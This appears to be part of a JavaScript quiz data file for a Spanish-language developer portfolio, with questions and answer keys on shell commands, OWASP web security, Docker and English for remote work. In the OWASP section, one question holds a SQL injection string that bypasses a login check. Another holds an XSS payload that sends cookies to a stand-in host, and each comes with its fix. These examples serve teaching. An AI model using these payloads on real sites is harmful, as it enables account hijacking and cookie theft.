            "A no borra nada; B borra todo lo de la carpeta actual",
            "Los dos fallan sin borrar nada",
            "A borra la carpeta actual; B no hace nada"
          ],
          answer: 1,
          why: "&& ejecuta el segundo comando solo si el primero tuvo éxito: cd falla y rm no corre. ; ejecuta el segundo siempre: cd falla, te quedás donde estabas y rm borra ahí. Por eso en scripts se usa &&."
        }
      ]
    },

    owasp: {
      title: "Seguridad web (OWASP)",
      questions: [
        {
          q: "Un login arma la consulta así. Un atacante escribe como email admin@tienda.com'-- y cualquier contraseña. ¿Qué pasa?",
          code: "String q = \"SELECT * FROM usuarios WHERE email = '\" + email +\n           \"' AND pass = '\" + pass + \"'\";",
          options: [
            "Falla porque la contraseña es incorrecta",
            "Entra como admin: el -- comenta la verificación de la contraseña",
            "La base de datos se borra",
            "Da error de sintaxis y no pasa nada"
          ],
          answer: 1,
          why: "La consulta queda WHERE email = 'admin@tienda.com'--' AND pass = '...'. La comilla cierra el texto y -- convierte el resto en comentario, así que solo se compara el email. Se arregla con PreparedStatement y parámetros (?), que nunca mezclan datos con código SQL."
        },
        {
          q: "Una app muestra comentarios así. Alguien publica el comentario de abajo. ¿Qué pasa cuando otro usuario abre la página?",
          code: "// JavaScript de la página\ncaja.innerHTML = comentario.texto;\n\n// texto publicado por el atacante\n<img src=x onerror=\"fetch('https://evil.example/?c=' + document.cookie)\">",
          options: [
            "Se ve el texto tal cual",
            "Se ejecuta el código en el navegador de cada visitante (XSS almacenado)",
            "El servidor se cae",
            "No pasa nada porque la imagen no existe"
          ],
          answer: 1,
          why: "innerHTML interpreta el texto como HTML. La imagen falla al cargar, se dispara onerror y corre el JavaScript del atacante, que puede robar cookies sin HttpOnly. Se arregla con textContent (como en este portfolio), sanitización y una CSP."
        },
        {
          q: "Ves tu pedido en /api/pedidos/1043. Cambiás la URL a /api/pedidos/1044 y ves el pedido de otra persona. ¿Qué vulnerabilidad es?",
          options: ["Inyección SQL", "Control de acceso roto (IDOR)", "XSS", "Falla criptográfica"],
          answer: 1,
          why: "Es Broken Access Control, el puesto 1 del OWASP Top 10. El servidor no verifica que el pedido pertenezca al usuario logueado. Usar IDs difíciles de adivinar no lo arregla: hay que chequear la propiedad en cada pedido, en el servidor."
        },
        {
          q: "¿Cuál es la forma correcta de guardar contraseñas?",
          options: [
            "Cifradas con AES para poder recuperarlas",
            "Con SHA-256 sin sal",
            "Con un hash lento y con sal, como bcrypt o Argon2",
            "En texto plano en una tabla aparte"
          ],
          answer: 2,
          why: "Las contraseñas no deben poder recuperarse, así que se guarda un hash, no algo cifrado. SHA-256 es demasiado rápido: con una GPU se prueban miles de millones por segundo. bcrypt y Argon2 son lentos a propósito y la sal evita las tablas precalculadas. Spring Security trae BCryptPasswordEncoder."
        },
        {
          q: "Este portfolio tiene la CSP script-src 'self'. Si alguien lograra inyectar <script>alert(1)</script> en la página, ¿qué pasaría?",
          options: [
            "Se ejecuta normalmente",
            "El navegador lo bloquea porque es un script inline",
            "Se ejecuta solo en Chrome",
            "La página no carga"
          ],
          answer: 1,
          why: "Con script-src 'self' solo corren scripts cargados desde archivos del mismo sitio. Un <script> inline se bloquea y aparece un error en la consola. Por eso la CSP es una segunda capa de defensa contra el XSS."
        }
      ]
    },

    docker: {
      title: "Docker y Docker Compose",
      questions: [
        {
          q: "En docker-compose tu backend usa jdbc:postgresql://localhost:5432/stock y no conecta, aunque la base está corriendo. ¿Por qué?",
          options: [
            "PostgreSQL no usa el puerto 5432",
            "Dentro de un contenedor, localhost es el propio contenedor; hay que usar el nombre del servicio (por ejemplo, db)",
            "Falta instalar Java",
            "Docker no permite bases de datos"
          ],
          answer: 1,
          why: "Cada contenedor tiene su propia red. Compose crea una red interna donde cada servicio se llama por su nombre: jdbc:postgresql://db:5432/stock. Por eso en tu proyecto el host JDBC tenía que ser el nombre del contenedor."
        },
        {
          q: "Corrés docker compose down -v. ¿Qué pasa con los productos cargados en PostgreSQL?",
          options: ["Quedan guardados", "Se borran: -v elimina los volúmenes", "Se exportan a un archivo", "Pasan a otro contenedor"],
          answer: 1,
          why: "Los datos viven en un volumen. down solo baja los contenedores y conserva los volúmenes; con -v también se borran. Usalo solo si querés empezar con la base vacía."
        },
        {
          q: "Cambiaste código Java y ejecutás docker compose up. ¿Qué versión corre?",
          options: [
            "La nueva, siempre",
            "Probablemente la vieja: si la imagen ya existe, no se reconstruye sin --build",
            "Ninguna: da error",
            "Las dos a la vez"
          ],
          answer: 1,
          why: "up reutiliza la imagen existente. Para recompilar con los cambios: docker compose up --build. Es una de las confusiones más comunes."
        },
        {
          q: "¿Para qué sirve el build multi-stage de tu Dockerfile?",
          options: [
            "Para correr varias apps en un contenedor",
            "Para compilar con Maven y el JDK en una etapa y copiar solo el .jar a una imagen final chica",
            "Para que el build sea más lento pero más seguro",
            "Para usar varias bases de datos"
          ],
          answer: 1,
          why: "La imagen final no lleva Maven, el JDK completo ni el código fuente. Es más chica, se descarga más rápido y tiene menos herramientas que un atacante podría aprovechar (menos superficie de ataque)."
        },
        {
          q: "¿Dónde conviene poner POSTGRES_PASSWORD?",
          options: [
            "En el Dockerfile, con ENV",
            "En un archivo .env que está en .gitignore (o en el gestor de secretos de la plataforma)",
            "En el README",
            "Escrito en el código Java"
          ],
          answer: 1,
          why: "Lo que ponés en el Dockerfile queda dentro de la imagen y cualquiera con la imagen lo puede leer (docker history). Un .env fuera de git, o las variables de entorno de Render, mantienen el secreto fuera del código."
        }
      ]
    },

    ingles: {
      title: "Inglés para trabajo remoto",
      questions: [
        {
          q: "Un cliente te escribe: \"Can you give me a ballpark estimate?\" ¿Qué te pide?",
          options: ["Un presupuesto exacto y firmado", "Una estimación aproximada", "Una reunión presencial", "Un descuento"],
          answer: 1,
          why: "\"Ballpark\" significa aproximado. Podés responder con un rango: \"Roughly 10 to 15 hours, I'll confirm after reviewing the repo.\""
        },
        {
          q: "En tu actualización semanal querés decir que estás trabado esperando acceso a la base de datos. ¿Cuál es la frase más natural?",
          options: ["I am stopped for the database.", "I'm blocked: I'm waiting for access to the database.", "The database is closed for me.", "I can't continue because database."],
          answer: 1,
          why: "\"Blocked\" y \"blocker\" son las palabras habituales en equipos remotos. La fórmula clásica de un update es: Done / Next / Blockers."
        },
        {
          q: "Un reviewer deja en tu Pull Request: \"Nit: rename this variable.\" ¿Qué significa \"nit\"?",
          options: ["Un error grave que hay que arreglar ya", "Un detalle menor, opcional", "Que el PR fue rechazado", "Que falta un test"],
          answer: 1,
          why: "\"Nit\" (de nitpick) marca un comentario menor, de estilo, que no bloquea. Igual conviene responder: \"Good catch, renamed.\""
        },
        {
          q: "¿Cuál es la mejor forma de pedir más plazo a un cliente?",
          options: [
            "Sorry, I am late.",
            "I need more time.",
            "I found an issue with the payment API. Could we move the deadline to Friday? I'll send a progress update tomorrow.",
            "The deadline is impossible."
          ],
          answer: 2,
          why: "Explica el motivo, propone una fecha concreta y ofrece visibilidad. Los clientes remotos valoran más la comunicación anticipada que la perfección."
        }
      ]
    }
  }
};
